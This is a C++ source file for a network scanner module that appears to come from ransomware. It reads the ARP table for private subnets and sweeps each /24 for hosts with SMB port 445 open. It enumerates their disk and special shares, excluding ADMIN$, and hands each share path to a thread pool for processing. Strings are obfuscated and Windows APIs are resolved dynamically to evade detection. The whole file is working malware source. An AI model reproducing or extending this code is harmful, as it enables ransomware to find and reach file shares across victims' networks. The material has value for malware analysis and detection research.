#include "network_scanner.h"
#include "../queue.h"
#include <iphlpapi.h>
#include <lmshare.h>
#include <lm.h>
#include <winnetwk.h>
#include <icmpapi.h>
#include <ws2ipdef.h>
#include <ws2tcpip.h>
#include <shlwapi.h>
#include <MSWSock.h>
#include "../filesystem/filesystem.h"
#include "../threadpool/threadpool.h"
#include "../api/getapi.h"
#include "../logs/logs.h"

#define SMB_PORT 445
#define STOP_MARKER 0xFFFFFFFF
#pragma comment(lib, "ws2_32.lib")

STATIC struct hostent* g_HostEntry = NULL;

enum COMPLETION_KEYS {

	START_COMPLETION_KEY = 1,
	CONNECT_COMPLETION_KEY = 2,
	TIMER_COMPLETION_KEY = 3

};

enum STATES {

	CONNECTED, 
	CONNECTING,
	NOT_CONNECTED

};

#pragma region TYPEDEFS

typedef struct subnet_info_ {
	
	ULONG dwAddress;
	TAILQ_ENTRY(subnet_info_) Entries;

} SUBNET_INFO, *PSUBNET_INFO;

typedef struct host_info_ {

	ULONG dwAddres;
	WCHAR wszAddress[INET_ADDRSTRLEN];
	TAILQ_ENTRY(host_info_) Entries;

} HOST_INFO, *PHOST_INFO;

typedef struct connect_context_ {

	OVERLAPPED Overlapped;
	SOCKET s;
	DWORD dwAddres;
	BYTE State;
	TAILQ_ENTRY(connect_context_) Entries;

} CONNECT_CONTEXT, *PCONNECT_CONTEXT;



typedef TAILQ_HEAD(subnet_list_, subnet_info_) SUBNET_LIST, * PSUBNET_LIST;
typedef TAILQ_HEAD(host_list_, host_info_) HOST_LIST, * PHOST_LIST;

typedef TAILQ_HEAD(connection_list_, connect_context_) CONNECTION_LIST, * PCONNECTION_LIST;

#pragma endregion TYPEDEFS

#pragma region VARIABLES

STATIC LPFN_CONNECTEX g_ConnectEx = NULL;
STATIC CRITICAL_SECTION g_CriticalSection;
STATIC SUBNET_LIST g_SubnetList;
STATIC HOST_LIST g_HostList;
STATIC CONNECTION_LIST g_ConnectionList;
STATIC HANDLE g_IocpHandle = NULL;
STATIC LONG g_ActiveOperations;

#pragma endregion VARIABLES

STATIC
DWORD GetCurrentIpAddress()
{
	CHAR szHostName[256];
	struct in_addr InAddr;

	if (SOCKET_ERROR == (INT)pgethostname(szHostName, 256)) {
		return 0;
	}

	g_HostEntry = (struct hostent*)pgethostbyname(szHostName);
	if (!g_HostEntry) {
		return 0;
	}

	return 0;
}

STATIC
BOOL
GetConnectEX()
{
	DWORD dwBytes;
	int rc;

	SOCKET sock = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if (sock == INVALID_SOCKET)
		return FALSE;

	GUID guid = WSAID_CONNECTEX;
	rc = (int)pWSAIoctl(sock, SIO_GET_EXTENSION_FUNCTION_POINTER,
		&guid, sizeof(guid),
		&g_ConnectEx, sizeof(g_ConnectEx),
		&dwBytes, NULL, NULL);

	if (rc != 0)
		return FALSE;

	rc =(int) pclosesocket(sock);
	if (rc != 0)
		return FALSE;

	return TRUE;
}

STATIC
BOOL
GetSubnets(__in PSUBNET_LIST SubnetList)
{
	ULONG TableSize = 0;
	PMIB_IPNETTABLE IpNetTable = NULL;

	pGetIpNetTable(IpNetTable, &TableSize, FALSE);
	if (!TableSize) {

		logs::Write(OBFW(L"GetIpNetTable fails. GetLastError = %lu"), pGetLastError());
		return FALSE;

	}

	IpNetTable = (PMIB_IPNETTABLE)m_malloc(TableSize);
	if (!IpNetTable) {
		return FALSE;
	}

	ULONG Result = (ULONG)pGetIpNetTable(IpNetTable, &TableSize, FALSE);
	if (Result != ERROR_SUCCESS) {
		
		logs::Write(OBFW(L"GetIpNetTable fails. GetLastError = %lu"), pGetLastError());
		free(IpNetTable);
		return FALSE;

	}

	for (ULONG i = 0; i < IpNetTable->dwNumEntries; i++) {

		WCHAR wszIpAddress[INET_ADDRSTRLEN];
		ULONG dwAddress = IpNetTable->table[i].dwAddr;	
		PUCHAR HardwareAddres = IpNetTable->table[i].bPhysAddr;
		ULONG HardwareAddressSize = IpNetTable->table[i].dwPhysAddrLen;
		
		RtlSecureZeroMemory(wszIpAddress, sizeof(wszIpAddress));

		IN_ADDR InAddr;
		InAddr.S_un.S_addr = dwAddress;
		PCHAR szIpAddress = pinet_ntoa(InAddr);
		DWORD le = WSAGetLastError();

		PCSTR p1 = (PCSTR)pStrStrIA(szIpAddress, OBFA("172."));
		PCSTR p2 = (PCSTR)pStrStrIA(szIpAddress, OBFA("192.168."));
		PCSTR p3 = (PCSTR)pStrStrIA(szIpAddress, OBFA("10."));
		PCSTR p4 = (PCSTR)pStrStrIA(szIpAddress, OBFA("169."));

		if (p1 == szIpAddress ||
			p2 == szIpAddress ||
			p3 == szIpAddress ||
			p4 == szIpAddress)
		{

			BOOL Found = FALSE;

			PSUBNET_INFO SubnetInfo = NULL;
			TAILQ_FOREACH(SubnetInfo, SubnetList, Entries) {

				if (!memcmp(&SubnetInfo->dwAddress, &dwAddress, 3)) {

					Found = TRUE;
					break;

				}

			}
			
			if (!Found) {

				BYTE bAddres[4];
				*(ULONG*)bAddres = dwAddress;
				bAddres[3] = 0;

				PSUBNET_INFO NewSubnet = (PSUBNET_INFO)m_malloc(sizeof(SUBNET_INFO));
				if (!NewSubnet) {
					break;
				}

				RtlCopyMemory(&NewSubnet->dwAddress, bAddres, 4);
				TAILQ_INSERT_TAIL(SubnetList, NewSubnet, Entries);

			}

		}
	}

	free(IpNetTable);
	return TRUE;
}

VOID
network_scanner::EnumShares(
	__in PWCHAR pwszIpAddress, 
	__out PSHARE_LIST ShareList
	)
{
	NET_API_STATUS Result;
	LPSHARE_INFO_1 ShareInfoBuffer = NULL;
	DWORD er = 0, tr = 0, resume = 0;;

	do
	{
		Result = (NET_API_STATUS)pNetShareEnum(pwszIpAddress, 1, (LPBYTE*)&ShareInfoBuffer, MAX_PREFERRED_LENGTH, &er, &tr, &resume);
		if (Result == ERROR_SUCCESS)
		{

			LPSHARE_INFO_1 TempShareInfo = ShareInfoBuffer;

			for (DWORD i = 1; i <= er; i++)
			{

				if (TempShareInfo->shi1_type == STYPE_DISKTREE	||
					TempShareInfo->shi1_type == STYPE_SPECIAL	||
					TempShareInfo->shi1_type == STYPE_TEMPORARY) 
				{

					PSHARE_INFO ShareInfo = (PSHARE_INFO)m_malloc(sizeof(SHARE_INFO));
					
					if (ShareInfo && plstrcmpiW(TempShareInfo->shi1_netname, OBFW(L"ADMIN$"))) {

						plstrcpyW(ShareInfo->wszSharePath, OBFW(L"\\\\"));
						plstrcatW(ShareInfo->wszSharePath, pwszIpAddress);
						plstrcatW(ShareInfo->wszSharePath, OBFW(L"\\"));
						plstrcatW(ShareInfo->wszSharePath, TempShareInfo->shi1_netname);

						logs::Write(OBFW(L"Found share %s."), ShareInfo->wszSharePath);
						TAILQ_INSERT_TAIL(ShareList, ShareInfo, Entries);

					}

				}

				TempShareInfo++;

			}

			pNetApiBufferFree(ShareInfoBuffer);
		}

	} while (Result == ERROR_MORE_DATA);
}

STATIC
DWORD
WINAPI
HostHandler(__in PVOID pArg)
{
	network_scanner::SHARE_LIST ShareList;
	TAILQ_INIT(&ShareList);

	while (TRUE) {

		pEnterCriticalSection(&g_CriticalSection);

		PHOST_INFO HostInfo = TAILQ_FIRST(&g_HostList);
		if (HostInfo == NULL) {

			pLeaveCriticalSection(&g_CriticalSection);
			pSleep(1000);
			continue;

		}

		TAILQ_REMOVE(&g_HostList, HostInfo, Entries);
		pLeaveCriticalSection(&g_CriticalSection);

		if (HostInfo->dwAddres == STOP_MARKER) {

			free(HostInfo);
			pExitThread(EXIT_SUCCESS);

		}

		network_scanner::EnumShares(HostInfo->wszAddress, &ShareList);
		while (!TAILQ_EMPTY(&ShareList))
		{

			network_scanner::PSHARE_INFO ShareInfo = TAILQ_FIRST(&ShareList);
			logs::Write(OBFW(L"Starting search on share %s."), ShareInfo->wszSharePath);
			threadpool::PutTask(threadpool::NETWORK_THREADPOOL, ShareInfo->wszSharePath);
			TAILQ_REMOVE(&ShareList, ShareInfo, Entries);
			free(ShareInfo);

		}

		free(HostInfo);

	}

	pExitThread(EXIT_SUCCESS);
	return EXIT_SUCCESS;
}

STATIC
BOOL
AddHost(
	__in DWORD dwAddres
)
{
	if (g_HostEntry) {
		INT i = 0;
		while (g_HostEntry->h_addr_list[i] != NULL) {
			DWORD dwCurrentAddr = *(DWORD*)g_HostEntry->h_addr_list[i++];
			if (dwCurrentAddr == dwAddres) {
				return FALSE;
			}
		}
	}

	PHOST_INFO HostInfo = (PHOST_INFO)m_malloc(sizeof(HOST_INFO));
	if (!HostInfo) {
		return FALSE;
	}

	DWORD dwAddress = INET_ADDRSTRLEN;
	SOCKADDR_IN temp;
	temp.sin_addr.s_addr = dwAddres;
	temp.sin_port = 0;
	temp.sin_family = AF_INET;
	HostInfo->dwAddres = dwAddres;

	if (dwAddres != STOP_MARKER) {


		if (SOCKET_ERROR == pWSAAddressToStringW((LPSOCKADDR)&temp, sizeof(temp), NULL, HostInfo->wszAddress, &dwAddres)) {

			free(HostInfo);
			return FALSE;

		}

	}

	pEnterCriticalSection(&g_CriticalSection); {

		TAILQ_INSERT_TAIL(&g_HostList, HostInfo, Entries);

	}
	pLeaveCriticalSection(&g_CriticalSection);
	return TRUE;
}

STATIC
BOOL
CreateHostTable()
{
	PSUBNET_INFO SubnetInfo = TAILQ_FIRST(&g_SubnetList);
	if (!SubnetInfo) {
		return FALSE;
	}

	BYTE bAddres[4];
	DWORD dwAddress;
	RtlCopyMemory(bAddres, &SubnetInfo->dwAddress, 4);

	for (BYTE i = 0; i < 255; i++) {

		bAddres[3] = i;
		RtlCopyMemory(&dwAddress, bAddres, 4);

		PCONNECT_CONTEXT ConnectCtx = (PCONNECT_CONTEXT)pGlobalAlloc(GPTR, sizeof(CONNECT_CONTEXT));
		if (!ConnectCtx) {
			break;
		}

		ConnectCtx->dwAddres = dwAddress;
		ConnectCtx->State = NOT_CONNECTED;
		ConnectCtx->s = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);
		if (ConnectCtx->s == INVALID_SOCKET) {

			pGlobalFree(ConnectCtx);
			continue;

		}

		SOCKADDR_IN SockAddr;
		RtlSecureZeroMemory(&SockAddr, sizeof(SockAddr));
		SockAddr.sin_family = AF_INET;
		SockAddr.sin_port = 0;
		SockAddr.sin_addr.s_addr = INADDR_ANY;

		if (pbind(ConnectCtx->s, (CONST SOCKADDR*) & SockAddr, sizeof(SockAddr)) != ERROR_SUCCESS) {

			pclosesocket(ConnectCtx->s);
			pGlobalFree(ConnectCtx);
			continue;

		}

		if (!pCreateIoCompletionPort((HANDLE)ConnectCtx->s, g_IocpHandle, CONNECT_COMPLETION_KEY, 0)) {

			pclosesocket(ConnectCtx->s);
			pGlobalFree(ConnectCtx);
			continue;

		}

		TAILQ_INSERT_TAIL(&g_ConnectionList, ConnectCtx, Entries);

	}

	TAILQ_REMOVE(&g_SubnetList, SubnetInfo, Entries);
	free(SubnetInfo);
	return TRUE;
}

STATIC
VOID
ScanHosts()
{
	PCONNECT_CONTEXT ConnectCtx = NULL;
	TAILQ_FOREACH(ConnectCtx, &g_ConnectionList, Entries) {

		DWORD dwBytesSent;
		SOCKADDR_IN SockAddr;
		RtlSecureZeroMemory(&SockAddr, sizeof(SockAddr));
		SockAddr.sin_family = AF_INET;
		SockAddr.sin_port = htons(SMB_PORT);
		SockAddr.sin_addr.s_addr = ConnectCtx->dwAddres;

		if (g_ConnectEx(ConnectCtx->s, (CONST SOCKADDR*) & SockAddr, sizeof(SockAddr), NULL, 0, &dwBytesSent, (LPOVERLAPPED)ConnectCtx)) {

			ConnectCtx->State = CONNECTED;
			AddHost(ConnectCtx->dwAddres);

		}
		else if (WSA_IO_PENDING == WSAGetLastError()) {

			g_ActiveOperations++;
			ConnectCtx->State = CONNECTING;

		}
	}
}

STATIC
BOOL
CompleteAsyncConnect(SOCKET s)
{
	int Result = (INT)psetsockopt(s, SOL_SOCKET, SO_UPDATE_CONNECT_CONTEXT, NULL, 0);
	if (Result != ERROR_SUCCESS)
		return FALSE;

	int Seconds;
	int Bytes = sizeof(Seconds);
	Result = (INT)pgetsockopt(s, SOL_SOCKET, SO_CONNECT_TIME, (char*)&Seconds, (PINT)&Bytes);
	if (Result != ERROR_SUCCESS)
		return FALSE;

	if (Seconds == 0xFFFFFFFF)
		return FALSE;

	return TRUE;
}

STATIC
VOID
WINAPI
TimerCallback(PVOID Arg, BOOLEAN TimerOrWaitFired) {
	pPostQueuedCompletionStatus(g_IocpHandle, 0, TIMER_COMPLETION_KEY, NULL);
}

STATIC
DWORD
WINAPI
PortScanHandler(PVOID pArg)
{
	g_ActiveOperations = 0;
	HANDLE hTimer = NULL;
	BOOL IsTimerActivated = FALSE;

	HANDLE hTimerQueue = pCreateTimerQueue();
	if (!hTimerQueue) {
		pExitThread(EXIT_FAILURE);
	}

	while (TRUE) {

		DWORD dwBytesTransferred;
		ULONG_PTR CompletionStatus;
		PCONNECT_CONTEXT ConnectContext;

		BOOL Success = (BOOL)pGetQueuedCompletionStatus(g_IocpHandle, &dwBytesTransferred, &CompletionStatus, (LPOVERLAPPED*)&ConnectContext, INFINITE);

		if (CompletionStatus == START_COMPLETION_KEY) {
			
			if (!CreateHostTable()) {
				break;
			}

			ScanHosts();

			if (!pCreateTimerQueueTimer(&hTimer, hTimerQueue, &TimerCallback, NULL, 30000, 0, 0)) {
				pExitThread(EXIT_FAILURE);
			}

			IsTimerActivated = FALSE;

		} else if (CompletionStatus == CONNECT_COMPLETION_KEY) {

			g_ActiveOperations--;

			if (Success && CompleteAsyncConnect(ConnectContext->s)) {

				ConnectContext->State = CONNECTED;
				AddHost(ConnectContext->dwAddres);

			} else {

				ConnectContext->State = NOT_CONNECTED;

			}

			if (!g_ActiveOperations && IsTimerActivated) {

				while (!TAILQ_EMPTY(&g_ConnectionList)) {

					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&g_ConnectionList);
					pshutdown(ConnectCtx->s, SD_SEND);
					pclosesocket(ConnectCtx->s);
					TAILQ_REMOVE(&g_ConnectionList, ConnectCtx, Entries);
					pGlobalFree(ConnectCtx);

				}

				if (!CreateHostTable()) {
					break;
				}

				ScanHosts();

				if (!pCreateTimerQueueTimer(&hTimer, hTimerQueue, &TimerCallback, NULL, 30000, 0, 0)) {
					pExitThread(EXIT_FAILURE);
				}

				IsTimerActivated = FALSE;

			}

		} else if (CompletionStatus == TIMER_COMPLETION_KEY) {

			IsTimerActivated = TRUE;

			if (g_ActiveOperations) {

				PCONNECT_CONTEXT ConnectCtx = NULL;
				TAILQ_FOREACH(ConnectCtx, &g_ConnectionList, Entries) {

					if (ConnectCtx->State == CONNECTING) {
						pCancelIo((HANDLE)ConnectCtx->s);
					}

				}

			} else {

				while (!TAILQ_EMPTY(&g_ConnectionList)) {

					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&g_ConnectionList);
					pshutdown(ConnectCtx->s, SD_SEND);
					pclosesocket(ConnectCtx->s);
					TAILQ_REMOVE(&g_ConnectionList, ConnectCtx, Entries);
					pGlobalFree(ConnectCtx);

				}

				if (!CreateHostTable()) {
					break;
				}

				ScanHosts();

				if (!pCreateTimerQueueTimer(&hTimer, hTimerQueue, &TimerCallback, NULL, 30000, 0, 0)) {
					pExitThread(EXIT_FAILURE);
				}

				IsTimerActivated = FALSE;
			}

		}

	}

	pDeleteTimerQueue(hTimerQueue);
	pExitThread(EXIT_SUCCESS);
	return EXIT_SUCCESS;
}


VOID
network_scanner::StartScan()
{
	WSADATA WsaData;
	HANDLE hHostHandler = NULL, hPortScan = NULL;
	PSUBNET_INFO SubnetInfo = NULL;

	g_ActiveOperations = 0;
	pWSAStartup(MAKEWORD(2, 2), &WsaData);
	pInitializeCriticalSection(&g_CriticalSection);

	if (!GetConnectEX()) {

		logs::Write(OBFW(L"Can't get ConnectEx."));
		goto cleanup;

	}

	GetCurrentIpAddress();
	
	g_IocpHandle = pCreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, NULL, 0);
	if (g_IocpHandle == NULL) {

		logs::Write(OBFW(L"Can't create io completion port."));
		goto cleanup;

	}

	TAILQ_INIT(&g_SubnetList);
	TAILQ_INIT(&g_HostList);
	TAILQ_INIT(&g_ConnectionList);

	if (!GetSubnets(&g_SubnetList)) {

		logs::Write(OBFW(L"Can't get subnets."));
		goto cleanup;

	}

	hHostHandler = pCreateThread(NULL, 0, &HostHandler, NULL, 0, NULL);
	if (hHostHandler == INVALID_HANDLE_VALUE) {

		logs::Write(OBFW(L"Can't create host thread."));
		goto cleanup;

	}

	hPortScan = pCreateThread(NULL, 0, &PortScanHandler, NULL, 0, NULL);
	if (hPortScan == INVALID_HANDLE_VALUE) {

		logs::Write(OBFW(L"Can't create port scan thread."));
		goto cleanup;

	}

	pPostQueuedCompletionStatus(g_IocpHandle, 0, START_COMPLETION_KEY, NULL);
	pWaitForSingleObject(hPortScan, INFINITE);

	AddHost(STOP_MARKER);
	pWaitForSingleObject(hHostHandler, INFINITE);

cleanup:
	pDeleteCriticalSection(&g_CriticalSection);
	if (g_IocpHandle) {
		pCloseHandle(g_IocpHandle);
	}
	if (hHostHandler) {
		pCloseHandle(hHostHandler);
	}
	if (hPortScan) {
		pCloseHandle(hPortScan);
	}

	pWSACleanup();
}